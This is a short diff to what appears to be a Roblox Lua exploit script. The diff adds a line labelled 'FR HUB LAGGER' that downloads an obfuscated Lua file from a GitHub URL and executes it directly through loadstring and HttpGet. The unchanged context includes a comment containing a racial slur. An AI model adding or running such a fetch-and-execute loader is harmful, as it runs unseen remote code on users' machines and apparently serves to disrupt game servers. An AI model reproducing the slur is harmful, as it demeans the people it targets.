@@ -1,3 +1,6 @@
+-- FR HUB LAGGER
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ook314745-svg/FRHUBLAGGER/refs/heads/main/obfuscated.lua%20(3).txt"))()
+
 -- new drop brainrot code my nigga
 
 _G.DB = _G.DB or {}
